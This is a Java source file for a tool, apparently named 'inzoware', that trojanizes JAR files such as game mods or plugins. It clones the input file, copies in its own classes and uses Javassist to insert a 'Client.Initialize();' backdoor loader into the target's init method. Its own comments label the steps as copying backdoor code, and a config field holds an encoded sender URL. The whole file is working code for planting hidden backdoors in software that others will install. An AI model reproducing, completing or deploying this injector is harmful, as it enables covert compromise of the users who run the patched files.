package com.inzo.technologies.inzoware.injector;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.lang.SystemUtils;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.JarURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.util.Map;

public class Injector {

    public static boolean patchFile(String orig, String out, SimpleConfig config, boolean override, boolean quiet) {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        if (!input.toFile().exists()) {
            if(!quiet) {
                InjectorGUI.displayError("Input file does not exist.");
                System.out.println("[Injector] Input file: " + input.getFileName() + " does not exist.");
            }
            return false;
        }

        /*--- Create Output File ---*/

        File temp = new File("temp");
        temp.mkdirs();
        temp.deleteOnExit();

        //Clone file
        try {
            Files.copy(input, output);
        } catch (FileAlreadyExistsException e) {
            if (override) {
                try {
                    Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
                } catch (IOException e1) {
                    if(!quiet) {
                        InjectorGUI.displayError("Unknown IO error when creating output file.");
                        System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
                        e.printStackTrace();
                    }
                    return false;
                }
            }else{
                return false;
            }

        } catch (IOException e) {
            if(!quiet) {
                InjectorGUI.displayError("Unknown IO Error when creating output file.");
                System.out.println("[Injector] Unknown error creating file: " + output.getFileName());
                e.printStackTrace();
            }
            return false;
        }

        if(!quiet) {
            System.out.println("[Injector] Reading plugin data for file: " + input.getFileName());
            System.out.println(input.toAbsolutePath());
        }


        String name = (String) ("Client");
        String mainClass = (String) (config.MainClass);

        if(!quiet)
            System.out.println("[Injector] Found plugin name: " + name + "\n[Injector] Found main class: " + mainClass);

        /*--- Copy Backdoor Code ---*/

        FileSystem outStream    = null;
        try {
            outStream   = FileSystems.newFileSystem(output, (ClassLoader) null);
        } catch (IOException e) {
            if(!quiet) {
                e.printStackTrace();
            }
        }

        if(!quiet)
            System.out.println("[Injector] Injecting resources.");

        int length = resource_paths_required.length;

        InputStream[] resourceStreams = new InputStream[length];
        Path[] targetPaths = new Path[length];

        //Add required resources
        for(int i = 0; i < resource_paths_required.length; i++){
            resourceStreams[i] = Injector.class.getResourceAsStream("/" + resource_paths_required[i].replace(".", "/") + ".class");
            targetPaths[i] = outStream.getPath("/" + resource_paths_required[i].replace(".", "/") + ".class");

            try {
                Files.createDirectories(targetPaths[i].getParent());
            } catch (IOException e) {
                continue;
            }

        }

        try {
            //copy files

            for (int i = 0; i < targetPaths.length; i++) {
                if(!quiet)
                    System.out.println("    (" + (i + 1) + "/" + targetPaths.length + ") " + targetPaths[i].getFileName());
                Files.copy(resourceStreams[i], targetPaths[i]);
            }

        }catch(FileAlreadyExistsException e){
            if(!quiet) {
                InjectorGUI.displayError("Mod already patched.");
                System.out.println("[Injector] Mod already patched.");
                e.printStackTrace();
            }

            try {
                outStream.close();
            } catch (IOException ex) {
                if(!quiet)
                    ex.printStackTrace();
            }

            return false;
        }
        catch(IOException e){
            if(!quiet) {
                InjectorGUI.displayError("Unknown IO error while copying resources.");
                System.out.println("[Injector] Unknown IO error while copying resources.");
                e.printStackTrace();
            }
            return false;
        }

        /*--- Insert bytecode into main class ---*/

        try {
            ClassPool pool = new ClassPool(ClassPool.getDefault());
            pool.appendClassPath(orig);

            //Get main class, and find onEnable method

            if(!quiet)
                System.out.println("[Injector] Injecting backdoor loader into class.");

            CtClass cc = pool.get(mainClass);
            CtMethod m = cc.getDeclaredMethod("init");

            if(!quiet)
                System.out.println("| Client.Initialize(); | Has Been Added");
            m.insertAfter("Client.Initialize();");

            //Write to temporary file
            cc.writeFile(temp.toString());
        }catch(Exception e){
            if(!quiet) {
                InjectorGUI.displayError("Unknown Javassist error.");
                System.out.println("[Injector] Unknown Javassist error.");
                e.printStackTrace();
            }
            return false;
        }

        /*--- Write new main class ---*/

        if(!quiet)
            System.out.println("[Injector] Writing patched main class.");
        Path patchedFile        = null;
        Path target             = null;

        try {
            //Write final patched file
            patchedFile = Paths.get("temp/" + mainClass.replace(".", "/") + ".class");
            target      = outStream.getPath("/" + mainClass.replace(".", "/") + ".class");

            Files.copy(patchedFile, target, StandardCopyOption.REPLACE_EXISTING);
            if(!quiet)
                System.out.println("[Injector] Finished writing file: " + output.getFileName());
            outStream.close();
        }catch(IOException e){
            if(!quiet) {
                System.out.println("[Injector] Unknown IO error when copying new main class.");
                e.printStackTrace();
            }
            return false;
        }


        return true;
    }

    //Simplifed config for injector gui
    public static class SimpleConfig {
        public String encodedSenderURL;
        public String MainClass;

        public SimpleConfig(String s1, String s2) {
            encodedSenderURL = s1;
            MainClass = s2;
        }
    }

    private static String[] resource_paths_required = {
            "com.inzo.technologies.inzoware.injector.Injector",
            "com.inzo.technologies.inzoware.injector.Injector$SimpleConfig"
    };
}
